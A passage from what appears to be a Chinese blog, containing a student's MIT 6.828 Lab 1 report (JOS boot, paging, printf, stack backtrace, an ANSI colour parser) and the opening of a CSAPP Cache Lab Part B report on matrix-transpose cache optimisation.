a[3] = %d\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>],</span><br><span class="line">           a[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// 输出200 400 301 302</span></span><br><span class="line"></span><br><span class="line">    c = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)c + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 将c先转换为char指针指向下一个字节后再转回int指针</span></span><br><span class="line">    <span class="comment">// 现在a数组的字节分布为（小端）C8000000 90010000 2D010000 2E010000</span></span><br><span class="line">    | (c的指针)*c = <span class="number">500</span>;</span><br><span class="line">    <span class="comment">// 执行后的a数组字节分布（小端）C8000000 90F40100 00010000 2E010000</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n"</span>, a[<span class="number">0</span>], a[<span class="number">1</span>], a[<span class="number">2</span>],</span><br><span class="line">           a[<span class="number">3</span>]);</span><br><span class="line">    <span class="comment">// 输出200 128144 256 302</span></span><br><span class="line"></span><br><span class="line">    b = (<span class="keyword">int</span> *)a + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 将b指向a[1]</span></span><br><span class="line">    c = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)a + <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 将a先转换为char指针指向下一个字节后再转回int指针</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"6: a = %p, b = %p, c = %p\n"</span>, a, b, c);</span><br><span class="line">    <span class="comment">// 输出0xff9bebcc, 0xff9bebd0和0xff9bebcd</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> ac, <span class="keyword">char</span> **av)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 函数入口</span></span><br><span class="line">    f();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>练习5：<br>修改了text段的加载地址使得汇编代码中的跳转地址出现错误，进而导致整个引导因为错误提前终止。</p>
<p>练习6：<br>结果是非常显然的，因为引导的作用就是将内核从磁盘加载进入内存中。使用objdump -h obj/kern/kernel可以看到如下的信息：<br>0 .text         00001809  f0100000  00100000  00001000  2**4<br>                CONTENTS, ALLOC, LOAD, READONLY, CODE<br>可以直到内核的text段会被加载至内存中0x100000（物理地址）处。</p>
<h3 id="第三部分-内核"><a href="#第三部分-内核" class="headerlink" title="第三部分 内核"></a>第三部分 内核</h3><h4 id="使用虚拟内存去解决位置依赖"><a href="#使用虚拟内存去解决位置依赖" class="headerlink" title="使用虚拟内存去解决位置依赖"></a>使用虚拟内存去解决位置依赖</h4><p>可以发现内核将自己链接至了非常高的虚拟地址，比如0xf0100000，为了将处理器虚拟地址的较低部分给用户程序去使用。将在下一个实验介绍这一现象。</p>
<p>实际上，许多的机器在物理内存中并没有0xf0100000这样的高地址。实际上由处理器的内存管理硬件将虚拟地址0xf0100000映射到了实际内存中的物理地址0x100000。</p>
<p>这涉及了分页机制以及页表。<br>在kern/entry.S设置CR0_PG标记之前，内存引用被当做线性地址。实际上，由于在boot/boot.S设置了线性地址到物理地址的一致映射，所以线性地址在这里可以等同于物理地址。<br>当CR0_PG标记被设置了之后，所有的内存引用都被当作虚拟地址。虚拟地址通过虚拟内存硬件被翻译成物理地址。<br>kern/entrypgdir.c将0xf0000000到0xf0400000的虚拟地址翻译为物理地址的0x000000到0x400000，也将0x00000000到0x00400000的虚拟地址翻译为物理地址的0x00000000到0x00400000。<br>引用这些地址范围以外的虚拟地址将会抛出缺页的异常。<br>但是还没有为该异常设置中断处理程序。这会导致QEMU导出机器状态并退出。</p>
<p>练习7：<br>在movl %eax, %cr0指令（启动页表）之前，0x00100000出的内存不为空，0xf0100000出的内存全为0。<br>当stepi之后，0xf0100000处的内存和0x00100000处的内存完全一样。这表明已经成功启用了页表，并且完成了地址的映射。</p>
<h4 id="控制台的格式化字符串"><a href="#控制台的格式化字符串" class="headerlink" title="控制台的格式化字符串"></a>控制台的格式化字符串</h4><p>练习8：<br>缺失的代码为：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="string">'o'</span>:</span><br><span class="line">	num = getuint(&amp;ap, lflag);</span><br><span class="line">base = <span class="number">8</span></span><br><span class="line"><span class="keyword">goto</span> number;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>console.c提供了基本的I/O操作，同时封装了cputchar、getchar等函数供printf.c中的printf使用。printf使用了vprintfmt去解析格式化字符串并提供可变参数的特性。</li>
<li>这段代码主要实现了换行。其首先检查了当前的光标是否超过了最大值，如果是，则证明需要进行换行。其将第1行到第MAX-1行的内容复制到第0行到第MAX-2行所在的内存中，然后将第MAX-1行置空。最后将光标设置到新一行的开始。</li>
<li>fmt指向了格式化字符串”x %d, y %x, z %d\n”<br>ap指向了局部变量并且初始值为1<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">vcprintf(<span class="number">0xf0102449</span>, <span class="number">0xf0110e14</span>);</span><br><span class="line"><span class="number">0xf0102449</span> -&gt; <span class="string">"x %d, y %x, z %d\n"</span> <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span></span><br><span class="line">cons_putc(<span class="number">120</span>);</span><br><span class="line">cons_putc(<span class="number">32</span>);</span><br><span class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>);</span><br><span class="line">Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e14</span> -&gt; <span class="number">1</span></span><br><span class="line">After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span></span><br><span class="line">cons_putc(<span class="number">49</span>);</span><br><span class="line">cons_putc(<span class="number">44</span>);</span><br><span class="line">cons_putc(<span class="number">32</span>);</span><br><span class="line">cons_putc(<span class="number">121</span>);</span><br><span class="line">cons_putc(<span class="number">32</span>);</span><br><span class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>);</span><br><span class="line">Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e18</span> -&gt; <span class="number">3</span></span><br><span class="line">After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span></span><br><span class="line">cons_putc(<span class="number">51</span>);</span><br><span class="line">cons_putc(<span class="number">44</span>);</span><br><span class="line">cons_putc(<span class="number">32</span>);</span><br><span class="line">cons_putc(<span class="number">122</span>);</span><br><span class="line">cons_put(<span class="number">32</span>);</span><br><span class="line">va_arg(<span class="number">0xf0110dbc</span>, <span class="keyword">int</span>);</span><br><span class="line">Before: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e1c</span> -&gt; <span class="number">4</span></span><br><span class="line">After: <span class="number">0xf0110dbc</span> -&gt; <span class="number">0xf0110e20</span> -&gt; <span class="number">536870922</span></span><br><span class="line">cons_put(<span class="number">52</span>);</span><br><span class="line">cons_put(<span class="number">10</span>);</span><br></pre></td></tr></table></figure>
注意这里va_arg是宏而不是函数，不能通过加断点的方式跟踪。我采用的方法是在调用va_arg的地方添加断点并跟踪。<br>在GNUmakefile中的C_FLAGS -O1会重排C代码，导致了追踪va_arg变得困难。所以，仅在此处将-O1变成-O0，尽管这会导致在backtrace时kernel panic。</li>
<li>57616 = 0xe110。此外，根据x86的小端序，&amp;i指向了byte序列0x72、0x6c、0x64、0x00。这等同于字符串”rld”。所以，最终的输出为”He110 World”。<br>需要将i改为0x726c6400。不需要修改57616。</li>
<li>这是由于程序从格式化字符串中推断出了应当有3个参数，所以程序会从cprintf的栈中多读取一个参数。但实际上只有2个参数。所以最后一个参数是未指定的。</li>
<li>vcprintf(…, const char * fmt)。</li>
</ol>
<h4 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h4><p>练习9：<br>f0100034:    bc 00 00 11 f0           mov    $0xf0110000,%esp<br>这一条指令初始化了引导栈，它位于0xf0110000处。内核仅通过设置esp寄存器的值为栈预留空间。栈指针指向高地址，并且栈自高地址向低地址延伸。</p>
<p>练习10：<br>本题考察了x86架构下的栈帧与函数调用。<br>函数调用时先将返回地址压栈，然后跳转至目标函数的起始地址；在目标函数内先将ebp寄存器的值（栈底）压栈保存，然后再将栈顶指针设置为新的栈底；<br>在函数中调用函数需要使用栈来传递参数，即将函数的参数以此压入栈中；<br>test_backtrace函数的汇编中使用了ebx寄存器，该寄存器为被调用者保存的寄存器，在使用的时候也要先压栈保存，再函数返回时恢复；<br>函数返回的时候通过先操作esp释放栈资源，然后恢复相应的被调用者保存的寄存器的值，最后调用汇编指令leave、ret返回；<br>leave指令先将esp的值置为ebp，然后再从栈中取出被保存的ebp的旧值；ret从栈中取出返回地址并跳转。</p>
<p>练习10-12：<br>mon_backtrace的实现如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mon_backtrace</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, struct Trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span>            ebp, eip, args[<span class="number">5</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line">    cprintf(<span class="string">"Stack backtrace:\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (ebp = read_ebp(); ebp != <span class="number">0</span>; ebp = *((<span class="keyword">uint32_t</span> *)ebp)) &#123;</span><br><span class="line">        eip = *((<span class="keyword">uint32_t</span> *)ebp + <span class="number">1</span>);</span><br><span class="line">        debuginfo_eip(eip, &amp;info);</span><br><span class="line">        args[<span class="number">0</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">2</span>);</span><br><span class="line">        args[<span class="number">1</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">3</span>);</span><br><span class="line">        args[<span class="number">2</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">4</span>);</span><br><span class="line">        args[<span class="number">3</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">5</span>);</span><br><span class="line">        args[<span class="number">4</span>] = *((<span class="keyword">uintptr_t</span> *)ebp + <span class="number">6</span>);</span><br><span class="line">        cprintf(<span class="string">"  ebp %08x  eip %08x  args %08x %08x %08x %08x %08x\n"</span>, ebp,</span><br><span class="line">                eip, args[<span class="number">0</span>], args[<span class="number">1</span>], args[<span class="number">2</span>], args[<span class="number">3</span>], args[<span class="number">4</span>]);</span><br><span class="line">        cprintf(<span class="string">"      %s:%d: %.*s+%d\n"</span>, info.eip_file, info.eip_line,</span><br><span class="line">                info.eip_fn_namelen, info.eip_fn_name, eip - info.eip_fn_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>查阅STABS文档可以知道表示行号的成员是n_desc，所以debuginfo_eip的缺失的代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">stab_binsearch(stabs, &amp;lline, &amp;rline, N_SLINE, addr);</span><br><span class="line"><span class="keyword">if</span> (lline &lt;= rline) &#123;</span><br><span class="line">    info-&gt;eip_line = stabs[lline].n_desc;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>修改后的commands结构体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">Command</span> <span class="title">commands</span>[] = &#123;</span></span><br><span class="line">   &#123; <span class="string">"help"</span>, <span class="string">"Display this list of commands"</span>, mon_help &#125;,</span><br><span class="line">   &#123; <span class="string">"kerninfo"</span>, <span class="string">"Display information about the kernel"</span>, mon_kerninfo &#125;,</span><br><span class="line">   &#123; <span class="string">"backtrace"</span>, <span class="string">"Display information about the stack frames"</span>, mon_backtrace &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<h4 id="提高-允许控制台输出不同颜色的文本"><a href="#提高-允许控制台输出不同颜色的文本" class="headerlink" title="提高 - 允许控制台输出不同颜色的文本"></a>提高 - 允许控制台输出不同颜色的文本</h4><p>要求能增强控制台的功能使得控制台可以输出不同颜色的字体。这里使用了传统的实现，解析嵌入在文本字符串中的ANSI转义序列来实现题目的要求。</p>
<p>在王爽的《汇编语言》中，已经接触过了字符的“属性字节”，一个字符的自低到高的第2个字节可以作为属性字节，用来指示字符的属性如闪烁、高亮、前景色、背景色等。<br>有关于ANSI转义序列的相关知识可以参考<a href="http://rrbrandt.dee.ufcg.edu.br/en/docs/ansi/" target="_blank" rel="noopener">这里</a>。</p>
<p>出于简化考虑，只部分实现ANSI转义序列中的<code>ESC[Ps;...;Psm</code>。</p>
<p>实现的思路是实现<code>&lt;kern/printf.c&gt;</code>中的punch函数的替代版本attribute_punch，来实现对于ANSI转义序列的解析，并且相应地设置字符的属性字节。</p>
<p>解析所需要的状态机具有三个状态：A_NORM代表正常的输出字符的状态、A_TRANS代表接收到[ESC]开始，从正常状态到解析转义序列的过渡状态、A_ESCAPE代表解析转义序列的状态。它们之间的状态转换图如图所示：</p>

<p>value用来存储每一个解析到的值，temp代表了解析过程中临时的属性字节，attribute代表了当前打印字符时附加的属性字节。</p>
<p>具体的实现代码在&lt;kern/printf.c&gt;中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// state for ANSI escape sequence interpretation</span></span><br><span class="line"><span class="keyword">enum</span> &#123; A_NORM = <span class="number">0</span>, A_TRANS, A_ESCAPE &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// colormap - number (x - 30/40)[0, 7] -&gt; attribute byte</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint16_t</span> colormap[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0x0000</span>, <span class="number">0x4400</span>, <span class="number">0x2200</span>, <span class="number">0x6600</span>, <span class="number">0x1100</span>, <span class="number">0x5500</span>, <span class="number">0x3300</span>, <span class="number">0x7700</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">attribute_punch</span><span class="params">(<span class="keyword">int</span> ch, <span class="keyword">int</span> *cnt)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> value     = <span class="number">0</span>;         <span class="comment">// value</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> state     = A_NORM;    <span class="comment">// current state</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> temp      = <span class="number">0x0000</span>,</span><br><span class="line">               attribute = <span class="number">0x0000</span>;    <span class="comment">// temp attribute, current attribute</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (state) &#123;    <span class="comment">// state machine</span></span><br><span class="line">        <span class="keyword">case</span> A_NORM:</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="number">0x1B</span>) &#123;       <span class="comment">// [ESC]</span></span><br><span class="line">                state = A_TRANS;    <span class="comment">// transfer from A_NORM to A_TRANS</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cputchar((attribute &amp; <span class="number">0xFF00</span>) |</span><br><span class="line">                         ch);    <span class="comment">// put character with attribute</span></span><br><span class="line">                *cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> A_TRANS:</span><br><span class="line">            <span class="keyword">if</span> (ch == <span class="string">'['</span>) &#123;         <span class="comment">// [</span></span><br><span class="line">                state = A_ESCAPE;    <span class="comment">// transfer from A_TRANS to A_ESCAPE</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                state = A_NORM;    <span class="comment">// transfer from A_TRANS to A_NORM</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> A_ESCAPE:</span><br><span class="line">            <span class="keyword">if</span> (ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) &#123;    <span class="comment">// digit - update value</span></span><br><span class="line">                value = value * <span class="number">10</span> + ch - <span class="string">'0'</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">';'</span> ||</span><br><span class="line">                       ch == <span class="string">'m'</span>) &#123;    <span class="comment">// ; or m set temp and clear value</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</span><br><span class="line">                    temp = colormap[<span class="number">0</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value == <span class="number">5</span>) &#123;</span><br><span class="line">                    temp |= <span class="number">0x8000</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">30</span> &amp;&amp; value &lt;= <span class="number">38</span>) &#123;</span><br><span class="line">                    temp |= colormap[value - <span class="number">30</span>] &amp;</span><br><span class="line">                            <span class="number">0x0700</span>;    <span class="comment">// look up in color map</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt;= <span class="number">40</span> &amp;&amp; value &lt;= <span class="number">48</span>) &#123;</span><br><span class="line">                    temp |=</span><br><span class="line">                        colormap[value - <span class="number">40</span>] &amp; <span class="number">0x7000</span>;    <span class="comment">// avoid complex cases</span></span><br><span class="line">                &#125;</span><br><span class="line">                value = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'m'</span>) &#123;    <span class="comment">// m needed extra work - update attribute</span></span><br><span class="line">                    attribute = temp;</span><br><span class="line">                    temp      = <span class="number">0x0000</span>;</span><br><span class="line">                    state     = A_NORM;    <span class="comment">// transfer from A_ESCAPE to A_NORM</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;               <span class="comment">// non_digit nor m</span></span><br><span class="line">                state = A_NORM;    <span class="comment">// transfer from A_ESCAPE to A_NORM</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vcprintf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, va_list ap)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// vprintfmt((void*)putch, &amp;cnt, fmt, ap);</span></span><br><span class="line">    <span class="comment">// use attribute_punch rather than punch</span></span><br><span class="line">    vprintfmt((<span class="keyword">void</span> *)attribute_punch, &amp;cnt, fmt, ap);</span><br><span class="line">    <span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后在monitor.c中添加相关cprintf代码，并重新编译测试。最终如图所示：</p>

<p>有关于实验指导中提到的打开vga硬件的graphics mode使得控制台绘制文本到图形帧缓冲区的实现，由于时间和难度原因，这里暂时跳过。</p>
<h2 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h2><p>最终执行<code>make grade</code>，评分脚本的输出如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">running JOS: (1.2s)</span><br><span class="line">  <span class="built_in">printf</span>: OK</span><br><span class="line">  backtrace count: OK</span><br><span class="line">  backtrace arguments: OK</span><br><span class="line">  backtrace symbols: OK</span><br><span class="line">  backtrace lines: OK</span><br><span class="line">Score: 50/50</span><br></pre></td></tr></table></figure><br>至此，实验一结束。</p>
<p>第一个实验总体来说更偏重于概念的理解、工具的使用而不是实际的代码。</p>
<p>尽管如此，大量的概念也浪费了我很多时间去理解。MIT的6.828同清华的ucore操作系统实验相比提供了相当多的reference（ucore的阅读材料几乎都是现成的），这也对文档阅读和信息检索能力有了更高的要求。</p>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/12/09/MIT6-828操作系统工程Lab1-Booting-a-PC实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    
    <article class="postShorten postShorten--thumbnailimg-bottom">
        <div class="postShorten-wrap">
            
            <div class="postShorten-header">
                <h1 class="postShorten-title">
                    
                        <a class="link-unstyled" href="/2017/09/25/深入理解计算机系统CacheLab-PartB实验报告/">
                            深入理解计算机系统CacheLab-PartB实验报告
                        </a>
                    
                </h1>
                <div class="postShorten-meta">
    <time datetime="2017-09-25T14:46:48+08:00">
	
		    9月 25, 2017
    	
    </time>
    
        <span>发布在 </span>
        
    <a class="category-link" href="/categories/计算机系统/">计算机系统</a>


    
</div>

            </div>
            
                <div class="postShorten-content">
                    <p>实验答案托管在我的<a href="https://github.com/BlackDragonF/CSAPPLabs/tree/master/CacheLab" target="_blank" rel="noopener">GitHub</a>上</p>
<blockquote>
<p>Cache Lab的Part B是我卡了比较久的实验，在7月份做完Part A之后我卡在了Part B的第二个矩阵优化，之后进度一直缓慢。直到几天之前团队分享，我才把这个实验重新捡了回来，最终将第二个矩阵转置优化到了1500+的miss数（尽管仍然没有达到满分），后参考了网上的思路完成了Part B，总结如下。</p>
</blockquote>
<h2 id="实验简介"><a href="#实验简介" class="headerlink" title="实验简介"></a>实验简介</h2><p>Cache Lab - Understanding Cache Memories主要是有关缓存的实验，对应于书本的第6章：存储器层次结构。主要阐明了缓存对于C语言程序的性能影响。</p>
<p>本实验的第二部分要求优化一个简单的矩阵变换函数，使其具有尽可能晓得缓存不命中数。</p>
<p>关于本实验的具体介绍详见<a href="http://csapp.cs.cmu.edu/3e/archlab32-handout.tar" target="_blank" rel="noopener">实验讲义</a>。</p>
<h2 id="实验要求-Part-B"><a href="#实验要求-Part-B" class="headerlink" title="实验要求 - Part B"></a>实验要求 - Part B</h2><p>在Part B中你需要在trans.c中写一个矩阵转置函数，该函数要能有尽可能少的缓存不命中(miss)数。</p>
<p>令A代表一个矩阵，A(i, j)代表矩阵A的第i行第j列的元素。<br>那么，令B为矩阵A的转置，则对于A中的任意一个元素，满足A(i, j) = B(j, i)。</p>
<p>一个朴素的矩阵转置函数如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>该函数是正确的，但却并不是高效的，因为其访问模式导致了相当多的缓存不命中。</p>
<p>你的任务是完成一个相似的函数，并对于不同大小的矩阵块（32×32，64×64，61×67），最小化该函数的缓存不命中数。</p>
<p>对于Part B有以下的要求和限制：</p>
<ol>
<li>你所写的程序在编译时不能有任何的警告</li>
<li>在每一个你所写的转置函数中，你最多只能定义12个int型的局部变量</li>
<li>你不能使用long型的变量或是使用任何的技巧来使得在一个变量中存入多余一个的值</li>
<li>你的转置函数不能使用递归</li>
<li>如果你使用辅助函数，那么在同一时刻，你的调用栈上也不能出现超过12个局部变量</li>
<li>你的转置函数不能修改矩阵A，但是，你能任意的修改矩阵B</li>
<li>你不能定义任何的数组或是任何使用malloc的变量</li>
</ol>
<h2 id="实验过程-Part-B"><a href="#实验过程-Part-B" class="headerlink" title="实验过程 - Part B"></a>实验过程 - Part B</h2><h3 id="缓存简介"><a href="#缓存简介" class="headerlink" title="缓存简介"></a>缓存简介</h3><h4 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h4><p>局部性分为时间局部性和空间局部性——在一个具有良好的时间局部性的程序中，被引用过一次的内存位置可能在不远的将来再被多次引用。在一个具有良好的空间局部性的程序中，如果一个内存位置被引用了，那么程序很可能在不远的将来引用附近的一个内存位置。</p>
<p>一般来说，有良好局部性的程序比局部性差的程序运行的更快。现代计算机系统的各个层次，设计都利用了局部性。</p>
<p>在硬件层，通过高速缓存存储器来保存最近被引用的代码和数据，提高对主存的访问速度。<br>在操作系统层面，将虚拟内存作为主存和磁盘间高速缓存。<br>在网络中，主机可以作为代理缓存经常被访问的网页，浏览器也可以缓存最近访问过的页面。</p>
<h4 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h4><p>我们可以依次地组织不同的存储器，形成一个典型的存储器层次结构。如下图所示。</p>
<div class="figure " style="width:;"><img class="fig-img" src="memory-arch.png" alt=""></div>
<p>在该结构中，自高层向底层走，存储设备变得更慢、更便宜和更大。每一层的存储器都作为下一级存储器的缓存。</p>
<h4 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h4><p>早期的计算机系统的存储器结构只有3层：CPU寄存器、DRAM主存储器和磁盘存储。随着CPU和主存之间不断加大的差距，系统设计者被迫在寄存器文件和主存之间加入了一个小的SRAM高速缓存处理器，称为L1高速缓存（一级缓存），L1高速缓存的访问速度几乎和寄存器一样快，典型地是约4个时钟周期。</p>
<p>随着CPU和主存之间的性能差距进一步增大，系统设计者在L1缓存和主存之间又加入了一个更大的高速缓存，称为L2高速缓存，可以在约10个时钟周期内被访问到。</p>
<p>有些现代系统还包括有一个更大的高速缓存，称为L3高速缓存，它位于L2高速缓存和主存之间，可以在大约50个时钟周期内被访问到。</p>
<h5 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h5><p>假定一个计算机系统，其每个存储器地址为m位，那么形成了M = 2 ^ m个不同的地址。</p>
